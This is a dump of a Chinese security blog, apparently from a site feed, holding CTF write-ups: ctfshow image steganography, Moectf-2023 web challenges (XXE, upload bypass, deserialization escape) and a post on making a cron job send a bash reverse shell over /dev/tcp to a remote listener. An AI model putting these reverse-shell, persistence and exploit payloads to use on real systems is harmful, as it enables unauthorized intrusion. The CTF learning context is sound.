文件尾：</code></pre><p>依次改为png,jpg,bmp,gif,tif,webp</p><img src="/2023/11/02/misc(ctfshow)/202139.png" class=""><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><p>是一张图片，但打开是一个假flag图片，用hexeditor打开在文件末尾找到flag</p><img src="/2023/11/02/misc(ctfshow)/203409.png" class=""><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>这道题把flag藏在了中间，搜索一下ctfshow就可以找到</p><img src="/2023/11/02/misc(ctfshow)/204502.png" class=""><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><p>还是直接搜索就可以找到flag</p><h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p>用editor打开并没有搜索到ctfshow，看其他师傅博客这里是图片里面隐藏了png图片，我们可以手动分离出来或者直接使用binwalk或者foremost</p><img src="/2023/11/02/misc(ctfshow)/212036.png" class=""><h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><p>跟第7题一样，用editor搜一下就能找到flag</p><h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><p>这题要用binwalk分离</p><pre><code>python binwalk -e xxx.png</code></pre><img src="/2023/11/02/misc(ctfshow)/201505.png" class=""><h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p>这道题要用到一个新的工具：tweakpng</p><p>下载好软件之后，打开图片，发现这个图有两个IDAT块，把图片拖进去删除第一个IDAT数据块，然后ctrl+shift+s另存为另外一张新的png图片就出来了flag</p><img src="/2023/11/02/misc(ctfshow)/204811.png" class=""><h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3><p>和上题一样的思路，不过这题有30个IDAT块，先用<strong>pngdebugger</strong>跑一下</p><pre><code>pngdebugger xxx.png</code></pre><p>发现没有出错的IDAT块</p><img src="/2023/11/02/misc(ctfshow)/211026.png" class=""><p>看其他师傅博客，说要删掉前8个IDAT块</p><h3 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h3><p>题目提示flag位置在图片末尾</p><p>先用editor看了一下文件后面隐约有flag的影子</p><img src="/2023/11/02/misc(ctfshow)/212926.png" class=""><p>然后看其他师傅博客说这里要每隔一段距离取一个字符，连起来就是flag</p><pre><code>text=&quot;631A74B96685738668AA6F4B77B07B216114655336A5655434343678632534DD38EF66AB37103395391F628237BA6545627C3254647E313A64E465F136FA65F5341E3107321D665438F1333239E9616C7D&quot;flag=&quot;&quot;for i in range(0,len(text),4):    x=int(text[i:i+2],16)    flag+=chr(x)print(flag)</code></pre><h3 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h3><p>用foremost或binwalk分离不出来，用binwalk检测出来文件：</p><img src="/2023/11/02/misc(ctfshow)/215958.png" class=""><p>看样子应该是另外一张JPG图片了，手扣试试，JPG图头文件一般是FFD8</p><p>其实是有三个FFD8头的第一个头肯定是原本图片的头，第二个FFD8和右边的字符对比了一下没有JFIF开头盲猜不是，第三个就有了，直接复制FFD8到最后FFD9保存为另外一张jpg图片</p><img src="/2023/11/02/misc(ctfshow)/220809.png" class=""><p>也可以用dd工具分离出来</p><img src="/2023/11/02/misc(ctfshow)/223956.png" class=""><p>该工具是linux下的自动化分离工具，用在当题目文件包含其他文件时，可以把其他文件分离出来的一款工具。</p><pre><code>dd if=源文件名 bs=1 skip=开始分离的字节数 of=目标文件名参数说明if=file #输入文件名，缺省为标准输入of=file #输出文件名，缺省为标准输出bs=bytes #同时设置读写块的大小为bytes，可代替ibs和obs。skip=blocks #从输入文件开头跳过blocks个块后再开始复制。</code></pre><h3 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h3><p>提示：flag被跳过去了</p><p>用editor即可找到flag</p><p>BMP格式的文件头里有4位字节叫作<code>偏移量</code>，是用来指定从哪个字节开始为实际图像数据用的。这题就是利用<code>增大这个偏移量</code>的方法，把冗余数据塞在了BMP头和图像数据中间的地方。因为<code>这段数据不会被识别</code>，所以可以说是跳过去了。</p><h3 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h3><p>和第10题一样，用binwalk分离出flag</p><h3 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h3><p>这里又学到一种工具：<strong>zsteg</strong>（分析和提取图片中的隐藏信息）</p><img src="/2023/11/02/misc(ctfshow)/214731.png" class=""><p>发现隐藏的数据，位置处于<code>extradata:0</code></p><p>将数据提取出来：<code>zsteg -E &quot;extradata:0&quot; misc17.png &gt; 1.txt</code></p><p>然后用binwalk分离一次1.txt，得到一个压缩包，解压之后用图片查看器打开即可看到flag</p><img src="/2023/11/02/misc(ctfshow)/220032.png" class=""><h3 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h3><p>提示：flag在标题、作者、照相机和镜头型号里。</p><p>直接看图片属性就可以找到flag</p><h3 id="misc19"><a href="#misc19" class="headerlink" title="misc19"></a>misc19</h3><p>提示：flag在主机上的文档名里</p><p>直接看图片属性看不出来，要用到一个linux工具：<strong>exiftool</strong></p><p>exiftool 文件名</p><img src="/2023/11/02/misc(ctfshow)/222755.png" class=""><h3 id="misc20"><a href="#misc20" class="headerlink" title="misc20"></a>misc20</h3><p>提示：flag在评论里</p><p>还是用exiftool</p><img src="/2023/11/02/misc(ctfshow)/223220.png" class=""><p>谐音，最终flag</p><pre><code>ctfshow&#123;c97964b1aecf06e1d79c21ddad593e42&#125;</code></pre><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h3><p>提示:flag在序号里</p><img src="/2023/11/02/misc(ctfshow)/202727.png" class=""><p>看到序列号是一串数字，我们先用hex转字符串试一下</p><pre><code>686578285826597329//hex(X&amp;Ys)</code></pre><p>应该是让我们将与xy有关的数字转为16进制，发现图片信息里有两组与XY有关的数据</p><p>如果不是整体直接转换的话，那么应该就是每段分别转hex，然后拼起来</p><pre><code>3902939465 2371618619 1082452817 2980145261//e8a22149 8d5c073b 4084eb51 b1a1686d</code></pre><h3 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22</h3><p>这里要使用一个新工具:MagicEXIF 直接打开即可看到<code>flag</code>。</p><pre><code>magicexif元数据编辑器是一款非常专业的照片magicexif元数据编辑器，该软件可以通过分析照片的元数据以及编码特征来计算图像可信度，从而判断照片是否被修改，同时还能对相机的快门次数、镜头参数、光圈档位等进行查看和编辑。</code></pre><img src="/2023/11/02/misc(ctfshow)/195035.png" class=""><p>看不清楚可以截图放大看</p><p>还有一种方法是用exiftool来提取缩略图</p><pre><code>exiftool -ThumbnailImage -b misc22.png &gt; 123</code></pre><img src="/2023/11/02/misc(ctfshow)/202748.png" class=""><pre><code>ctfshow&#123;dbf7d3f84b0125e833dfd3o80820a129&#125;</code></pre><h3 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h3><p>提示：flag在时间里</p><p>用exiftool</p><img src="/2023/11/02/misc(ctfshow)/204243.png" class=""><p>发现history Action里面有提示，意思是先转换时间戳，然后再把10进制转换成16进制</p><p>这里利用<a href="http://tool.lu/timestamp/">在线网站</a>获取时间戳</p><pre><code>874865822 2699237688 2156662245 460377706</code></pre><p>然后根据上面的经验把这些数字转换成字符串用Python的hex()函数，代码如下</p><pre><code>print(&#39;ctf&#123;&#39;+hex(874865822)[2:]+hex(2699237688)[2:]+hex(2156662245)[2:]+hex(460377706)[2:]+&#39;&#125;&#39;)</code></pre><h3 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h3><p>这道题要根据提示：**<code>H4ppy Apr1l F001&#39;s D4y！</code>**中的F001来查找</p><p>使用editor打开图片搜索F001可以看到ctfshow的样式，把它提取出来即可</p><img src="/2023/11/02/misc(ctfshow)/215343.png" class=""><pre><code>ctfshow&#123;fcbd427caf4a52f1147ab44346cd1cdd&#125;</code></pre><h3 id="misc24"><a href="#misc24" class="headerlink" title="misc24"></a>misc24</h3><p>通过<a href="https://blog.csdn.net/aidem_brown/article/details/80500637">这篇博客</a>了解一下bmp文件结构</p><p>用010editor看一下文件结构，文件头占了54个字节(0–53)，文件尾的位置在675053字节处（后面两个字节是windows的补0），<strong>又因为每个像素由3个字节表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red）</strong>，所以文件真实的像素大小为(675053-53)&#x2F;3&#x3D;225000</p><p>这题的宽度是对的，所以正确的高度是225000&#x2F;900&#x3D;250</p><p>借助010editor修改高度</p><img src="/2023/11/02/misc(ctfshow)/194733.png" class=""><h3 id="misc25"><a href="#misc25" class="headerlink" title="misc25"></a>misc25</h3><p>通过<a href="https://www.cnblogs.com/senior-engineer/p/9548347.html">这篇博客</a>了解一下png文件结构</p><p>提示：flag在图片下面</p><p>用TweakPNG查看图片发现图片的CRC值不对</p><img src="/2023/11/02/misc(ctfshow)/200155.png" class=""><p>然后借助010editor的png.bt模板，可以查看图片二进制数据，也就能和上题一样简单修改图片数据</p><p>这道题还要对crc进行爆破：</p><pre><code>import binasciiimport structcrcbp = open(&quot;C:/Users/32572/Desktop/misc25/misc25.png&quot;, &quot;rb&quot;).read()  # 打开图片crc32frombp = int(crcbp[29:33].hex(), 16)  # 读取图片中的CRC校验值print(crc32frombp)for i in range(4000):  # 宽度1-4000进行枚举    for j in range(4000):  # 高度1-4000进行枚举        data = crcbp[12:16] + \               struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + crcbp[24:29]        crc32 = binascii.crc32(data) &amp; 0xffffffff        # print(crc32)        if (crc32 == crc32frombp):  # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定            print(i, j)            print(&#39;hex:&#39;, hex(i), hex(j))            exit(0)</code></pre><p>得到图片正确的宽度和高度是900和250</p><h3 id="misc26"><a href="#misc26" class="headerlink" title="misc26"></a>misc26</h3><p>提示：flag还是在图片下面，但到底有多下面？</p><p>用上面的脚本跑出来是900 606</p><p>用010editor改一下</p><img src="/2023/11/02/misc(ctfshow)/204647.png" class=""><p>还需要把实际高度转换成16进制</p><pre><code>ctfshow&#123;94aef1+True height(hex) of this picture+087a7ccf2e28e742efd704c&#125;ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125;</code></pre><h3 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h3><p>通过这篇文章了解一下jpg文件结构</p><p><a href="https://cloud.tencent.com/developer/article/1427939">https://cloud.tencent.com/developer/article/1427939</a></p><p><a href="https://www.cnblogs.com/bandy/p/4956086.html">https://www.cnblogs.com/bandy/p/4956086.html</a></p><p>这关也是修改高度，可以借助010editor来修改，稍微改个大点的值就可以看到flag</p><h3 id="misc28"><a href="#misc28" class="headerlink" title="misc28"></a>misc28</h3><p>通过<a href="https://blog.csdn.net/Swallow_he/article/details/76165202">这篇文章</a>了解一下GIF文件结构</p><p>还是借助010editor修改高度</p><img src="/2023/11/02/misc(ctfshow)/213308.png" class=""><p>注意这里的宽高在DATA模块里面修改</p><p>直接打开看不到flag，可以看预览图或用<strong>Stegsolve</strong>打开</p><img src="/2023/11/02/misc(ctfshow)/214624.png" class=""><h3 id="misc29"><a href="#misc29" class="headerlink" title="misc29"></a>misc29</h3><p>这道题还是GIF文件，但不同的是这个文件有10帧数，看其他师傅博客说可以把所有帧的高度都改了</p><p>我们使用010editor对所有的9600都替换为FA00</p><p>然后使用stegsolve点击Analyse-&gt;Frame Browser，再翻到第8帧，就可以看到flag</p><img src="/2023/11/02/misc(ctfshow)/223313.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定时任务反弹shell报错(CRON)info(NoMTAinstalled,discardingoutput)</title>
      <link href="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/"/>
      <url>/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/</url>
      
        <content type="html"><![CDATA[<p>最近在学习反弹shell时遇到定时任务反弹shell没有反应的问题</p><p>首先将受害机的shell修改为bash然后重启</p><pre><code>usermod -s /bin/bash 用户名</code></pre><p>再在受害机中添加定时任务(crontab -e)</p><pre><code>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</code></pre><p>攻击机开启2333端口监听</p><pre><code>netcat -lvvp 2333</code></pre><p>可是死活就是连不上，看一看cron的状态：</p><img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/195612.png" class=""><p>可以看到这边日志给出的错误信息是 No MTA installed，discarding output,查了一下以为是没有安装邮件系统的原因就安装了postfix，结果没有报错了但还是连不上shell</p><p>最后在<a href="https://blog.csdn.net/sdb5858874/article/details/81837440%E9%87%8C%E7%9C%8B%E5%88%B0%E4%BA%86%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%8E%9F%E5%9B%A0%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%EF%BC%9A">https://blog.csdn.net/sdb5858874/article/details/81837440里看到了真正的原因以及解决方法：</a></p><p>kali系统默认会将计划任务的错误信息以邮件的方式发送给用户，但是由于kali系统默认没有安装邮件系统，所以真正的报错信息并不是No MTA installed，discarding output这句话</p><p>想看到真正的报错信息有两种解决办法：</p><p><strong>1、</strong>由于我们刚才已经安装了邮件系统那么直接来<code>/var/mail/用户名</code>文件中看一下报错邮件：</p><img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/201801.png" class=""><p><strong>2、</strong>将计划任务的错误信息输出到一个文件内</p><pre><code>*/1  *  *  *  *  /bin/bash -i &#39;&gt;&amp;/dev/tcp/47.xxx.xx.xxx/2333 0&gt;&amp;1&#39; &gt;/tmp/error.txt 2&gt;&amp;1</code></pre><img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/203106.png" class=""><p>这本质上不就是shell不是bash，但我们最开始已经把系统的shell换为bashl了啊</p><p>其实这里是linux里面的cron中command执行的shell环境是&#x2F;bin&#x2F;sh</p><p>有两种方法改变cron执行命令的shell</p><p><strong>1、改系统sh软链接</strong></p><p>在&#x2F;bin目录下执行ls -l | grep -w “sh”:</p><img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/204913.png" class=""><p>发现sh指向的其实是dash，直接修改</p><pre><code>ln - s -f bash /bin/sh</code></pre><p>成功反弹shell！</p><p><strong>2、将反弹shell的语句写入脚本，然后crontab任务定时执行脚本</strong></p><p>先建立一个脚本cronshell，并赋予执行权限</p><pre><code>#!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/xxx.xx.x.xx/2333 0&gt;&amp;1</code></pre><p>然后修改计划任务*</p><img src="/2023/10/28/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%E6%8A%A5%E9%94%99(CRON)%20info%20(No%20MTA%20installed,discarding%20output)/215527.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf-2023</title>
      <link href="/2023/10/04/Moectf-2023/"/>
      <url>/2023/10/04/Moectf-2023/</url>
      
        <content type="html"><![CDATA[<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><img src="/2023/10/04/Moectf-2023/170243.png" class=""><p>对应着要求改包就行</p><img src="/2023/10/04/Moectf-2023/171502.png" class=""><h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>将压缩包下载下来，在pdf最后可找到一个字符串，先16进制解码，再base64解码即可</p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p>F12全局审查元素搜索关键字<code>moectf</code>,成功发现在注释里藏着的flag</p><pre><code>&lt;!--经过tracker，破获出内容为moectf&#123;find_comments_0m9M43IkulWxnEustqohoxoa3zEsToT7&#125;--&gt;</code></pre><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>先下载attachments.tar:</p><img src="/2023/10/04/Moectf-2023/174032.png" class=""><p>可以看到是一些json格式的数据</p><p>根据提示，我们先注册</p><p>返回数据包{“error”: “ok”, “data”: {“status”: “ok”}}</p><p>然后登录：</p><img src="/2023/10/04/Moectf-2023/174646.png" class=""><p>这次返回了一个token：eyJ1c2VybmFtZSI6ICJmZW5nIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ&#x3D;&#x3D;</p><p>将此token携带上再次发包，并且请求头改为GET &#x2F;flag</p><p>返回一个假flag</p><p>base64解码token试试：</p><pre><code>&#123;&quot;username&quot;: &quot;feng&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;</code></pre><p>将role的值改为admin再base64编码发包，成功获得flag</p><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>这道题要写脚本：</p><pre><code>import requestsimport resession=requests.session()url=&quot;http://localhost:59398&quot;data=&#123;&quot;driver&quot;:&quot;ttycp3&quot;,&quot;steering_control&quot;:&#39;0&#39;,&quot;throttle&quot;:&#39;2&#39;&#125;for i in range(7):s=session.post(url=url,data=data)if &quot;moectf&quot; in s.text:print(s.text)breakatt=re.findall(&quot;&lt;font color=\&quot;red\&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;,s.text)print(att)if &quot;直行&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;0&#39;elif &quot;左&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;1&#39;print(data)elif &quot;右&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;-1&#39;if &quot;保持&quot; in att[0]:data[&quot;throttle&quot;]=&#39;1&#39;elif &quot;大&quot; in att[0]:data[&quot;throttle&quot;]=&#39;2&#39;elif &quot;小&quot; in att[0]:data[&quot;throttle&quot;]=&#39;0&#39;</code></pre><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>经过测试发现只能上传.png文件，而且不能上传.htaccess</p><p>后面发现更改name的值可以显示源码：</p><img src="/2023/10/04/Moectf-2023/194707.png" class=""><pre><code>&lt;?php$targetDir = &#39;uploads/&#39;;$allowedExtensions = [&#39;png&#39;];if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;file&#39;])) &#123;    $file = $_FILES[&#39;file&#39;];    $tmp_path = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];    if ($file[&#39;type&#39;] !== &#39;image/png&#39;) &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件类型不符合要求&#39;]));    &#125;    if (filesize($tmp_path) &gt; 512 * 1024) &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件太大&#39;]));    &#125;    $fileName = $file[&#39;name&#39;];    $fileNameParts = explode(&#39;.&#39;, $fileName);    if (count($fileNameParts) &gt;= 2) &#123;        $secondSegment = $fileNameParts[1];        if ($secondSegment !== &#39;png&#39;) &#123;            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));        &#125;    &#125; else &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));    &#125;    $uploadFilePath = dirname(__FILE__) . &#39;/&#39; . $targetDir . basename($file[&#39;name&#39;]);    if (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;        die(json_encode([&#39;success&#39; =&gt; true, &#39;file_path&#39; =&gt; $uploadFilePath]));    &#125; else &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件上传失败&#39;]));    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>审计一下发现它只对文件名第一个点后面的内容作检测，所以我们只需要传个hhh.png.php即可绕过</p><p>然后rce</p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>先随便抓一个包：</p><img src="/2023/10/04/Moectf-2023/221307.png" class=""><p>看这意思应该是xxe漏洞</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;xml&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/xml&gt;</code></pre><p>对payload进行url编码后拿到flag</p><h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><img src="/2023/10/04/Moectf-2023/200522.png" class=""><p>根据题目提示，对id进行爆破</p><img src="/2023/10/04/Moectf-2023/201818.png" class=""><p>在长度明显与别的有很大差别的163中找到flag</p><h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p>这道题没有对后缀做限制，先正常访问传上去的php文件发现空白，我们随便修改文件名会报错：</p><img src="/2023/10/04/Moectf-2023/204413.png" class=""><p>我们尝试访问index.php，然后下载图片查看源码，里面啥也没有，再尝试&#x2F;flag:</p><pre><code>hello~Flag Not Here~Find Somewhere Else~&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;Not Here~~~~~~~~~~~~~ awa</code></pre><p>再访问Fl3g_n0t_Here_dont_peek!!!!!.php，这个文件想当然会在&#x2F;var&#x2F;www&#x2F;html文件夹下面</p><img src="/2023/10/04/Moectf-2023/205508.png" class=""><p>数组绕过即可</p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>index.php:</p><pre><code>&lt;?phphighlight_file(__FILE__);require_once(&#39;Hanxin.exe.php&#39;);$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;夺命十三枪&#39;;$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);$before = serialize($new_visitor);$after = Deadly_Thirteen_Spears::Make_a_Move($before);echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;try&#123;    echo unserialize($after);&#125;catch (Exception $e) &#123;    echo &quot;Even Caused A Glitch...&quot;;&#125;?&gt; </code></pre><p>Hanxin.exe.php:</p><pre><code>&lt;?phpif (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) &#123;    highlight_file(__FILE__);&#125;class Deadly_Thirteen_Spears&#123;    private static $Top_Secret_Long_Spear_Techniques_Manual = array(        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;    );    public static function Make_a_Move($move)&#123;        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement)&#123;            $move = str_replace($index, $movement, $move);        &#125;        return $move;    &#125;&#125;class Omg_It_Is_So_Cool_Bring_Me_My_Flag&#123;    public $Chant = &#39;&#39;;    public $Spear_Owner = &#39;Nobody&#39;;    function __construct($chant)&#123;        $this-&gt;Chant = $chant;        $this-&gt;Spear_Owner = &#39;Nobody&#39;;    &#125;    function __toString()&#123;        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;)&#123;            return &#39;Far away from COOL...&#39;;        &#125;        else&#123;            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);        &#125;    &#125;&#125;?&gt; </code></pre><p>做题的时候老是想不起来字符串逃逸</p><p><code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>共35个字符，找出相应的字符串复制几遍逃逸即可</p><pre><code>chant=fdsdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></pre><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><pre><code>from secrets import users, saltimport hashlibimport base64import jsonimport http.serverwith open(&quot;flag.txt&quot;,&quot;r&quot;) as f:    FLAG = f.read().strip()def gethash(*items):    c = 0    for item in items:        if item is None:            continue        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?    return hex(c)[2:]assert &quot;admin&quot; in usersassert users[&quot;admin&quot;] == &quot;admin&quot;hashed_users = dict((k,gethash(k,v)) for k,v in users.items())eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate(&#123;ord(c):None for c in &quot;\x00&quot;&#125;)) # what is it?def decrypt(data:str):        for x in range(5):            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?        return data__page__ = base64.b64encode(&quot;PCFET0NU...KPC9odG1sPg==&quot;)       class MyHandler(http.server.BaseHTTPRequestHandler):    def do_GET(self):        try:            if self.path == &quot;/&quot;:                self.send_response(200)                self.end_headers()                self.wfile.write(__page__)            else:                self.send_response(404)                self.end_headers()                self.wfile.write(b&quot;404 Not Found&quot;)        except Exception as e:            print(e)            self.send_response(500)            self.end_headers()            self.wfile.write(b&quot;500 Internal Server Error&quot;)    def do_POST(self):        try:            if self.path == &quot;/login&quot;:                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))                payload = json.loads(body)                params = json.loads(decrypt(payload[&quot;params&quot;]))                print(params)                if params.get(&quot;username&quot;) == &quot;admin&quot;:                    self.send_response(403)                    self.end_headers()                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)                    print(&quot;admin&quot;)                    return                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):                    self.send_response(403)                    self.end_headers()                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)                    print(&quot;same&quot;)                    return                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))                for k,v in hashed_users.items():                    if hashed == v:                        data = &#123;                            &quot;user&quot;:k,                            &quot;hash&quot;:hashed,                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;                        &#125;                        self.send_response(200)                        self.end_headers()                        self.wfile.write(json.dumps(data).encode())                        print(&quot;success&quot;)                        return                self.send_response(403)                self.end_headers()                self.wfile.write(b&quot;Invalid username or password&quot;)            else:                self.send_response(404)                self.end_headers()                self.wfile.write(b&quot;404 Not Found&quot;)        except Exception as e:            print(e)            self.send_response(500)            self.end_headers()            self.wfile.write(b&quot;500 Internal Server Error&quot;)if __name__ == &quot;__main__&quot;:    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)    server.serve_forever()</code></pre><p>看不大懂，但可以看个大概</p><pre><code>hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))                for k,v in hashed_users.items():                    if hashed == v:                        data = &#123;                            &quot;user&quot;:k,                            &quot;hash&quot;:hashed,                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;                        &#125;                        self.send_response(200)                        self.end_headers()                        self.wfile.write(json.dumps(data).encode())                        print(&quot;success&quot;)                        return</code></pre><p>这里要求我们的hashed等于v</p><p>hashed &#x3D; gethash(params.get(“username”),params.get(“password”))</p><pre><code>def 